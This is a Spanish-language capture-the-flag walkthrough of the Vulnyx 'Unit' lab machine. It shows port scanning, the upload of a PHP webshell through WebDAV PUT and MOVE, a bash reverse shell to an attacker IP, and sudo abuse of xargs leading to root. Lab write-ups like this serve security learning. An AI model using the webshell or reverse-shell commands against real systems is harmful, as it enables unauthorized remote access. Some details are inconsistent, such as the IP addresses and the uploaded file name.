---
title: Vulnyx - Unit
author: estx
date: 2024-04-29 12:10:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'File Upload', 'Binary Abusing']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Unit/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **Information Leakage, Local Port Forwarding**

### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.69	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```

a. Enumeramos los puertos que están abiertos.

```bash
❯ nmap -p- -sS --min-rate 5000 -Pn -n 192.168.100.68 -oG ports

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

b. Vemos las versiones de los servicios que se están ejecutando

```bash
❯ nmap -p22,80,8080 -sCV 192.168.100.69 -oN versions

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-title: 415 Unsupported Media Type
|_http-server-header: nginx/1.22.1
8080/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Potentially risky methods: PUT MOVE
|_http-title: 415 Unsupported Media Type
```

c. Al visitar el sitio web sale un mensaje de `Unsupported Media Type`. En el output del comando anterior vemos que existen dos métodos HTTP `PUT` y `MOVE`

* Si consultamos en [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav) vemos que existen algunas vulnerabilidades al tener los dos métodos activos.

d. Si subimos algunos archivos con diferentes extensiones no nos dejará, pero, al subir un archivo `.txt` nos deja

```bash
❯ curl -T 'test.txt' 'http://192.168.100.69:8080/'
❯ curl -s -X GET 'http://192.168.100.69:8080/test.txt'
Hola
```

* Lo que haremos es subir una webshell en php con la extensión `.txt`, luego, cambiaremos la extensión con `MOVE`

```bash
❯ cat shell.txt
<?php system($_GET['cmd']); ?>

❯ curl -T 'test.txt' 'http://192.168.100.69:8080/'
❯ curl -X MOVE --header 'Destination:http://192.168.100.69:8080/shell.php' 'http://192.168.100.69:8080/shell.txt'
```

e. Con esto nos entablamos una reverse shell

```bash
❯ curl -s -X GET "http://192.168.100.69:8080/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/[IP Atacante]/4443%200>%261'"
------------------------------------------------------------------------
❯ nc -lvnp 4443
www-data@unit:~/unit$
```

### Escalada de Privilegios 💹

a. Ahora realizamos un tratamiento de la TTY en la reverse shell

```bash
www-data@unit:~/unit$ script /dev/null -c bash
www-data@unit:~/unit$ ^Z
[1]  + 44624 suspended  nc -lvnp 4443
❯ stty raw -echo;fg
[1]  + 44624 continued  nc -lvnp 4443
                                     reset xterm

www-data@unit:~/unit$ export TERM=xterm-256color
www-data@unit:~/unit$ source /etc/skel/.bashrc
```

b. Listamos los permisos a nivel de sudoers de este usuario

```bash
www-data@unit:~/unit$ sudo -l

User www-data may run the following commands on unit:
    (jones) NOPASSWD: /usr/bin/xargs
```

* En [GTOFBins] vemos una forma de escalar privilegios para convertirnos en el usuario `jones`

```bash
www-data@unit:~/unit$ sudo -u jones /usr/bin/xargs -a /dev/null bash
jones@unit:/var/www/unit$
```

c. Vemos los permisos a nivel de sudoers de este usuario

```bash
jones@unit:/var/www/unit$ sudo -u root /usr/bin/su root
root@unit:/var/www/unit# cat /root/root.txt 
0d65e83f34a9f15f04ca3ec89cc25595
```

### Extras 🌟

1. El archivo de configuración de `nginx` se encuentra en `/etc/nginx/sites-available/default`

```bash
if ($request_uri !~ ^/[^?]*\.txt(?:\?.*)?$) {
    return 415;
}
```

> La regex `^/[^?]*\.txt(?:\?.*)?$` se encarga de reconocer si la url termina en .txt, caso contrario, devuelve el código de estado `415: Unsupported Media Type`
{: .prompt-info }

2. Una forma de fuzzing para saber que archivos podemos subir o no se haría así

```bash
❯ wfuzz -c -t 10 --hc=415 -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt "http://192.168.100.69:8080/a.FUZZ"

==============================================================
ID           Response   Lines    Word    Chars    Payload
==============================================================
000000003:   404        7 L      11 W    153 Ch    "php"
000000007:   404        7 L      11 W    153 Ch    "txt"
```

* Con esto sabemos que podemos subir archivos `.php` o `.txt`, sin embargo, en este caso no se pueden subir archivos `.php` directamente, si no, se debe cambiar la extensión después.
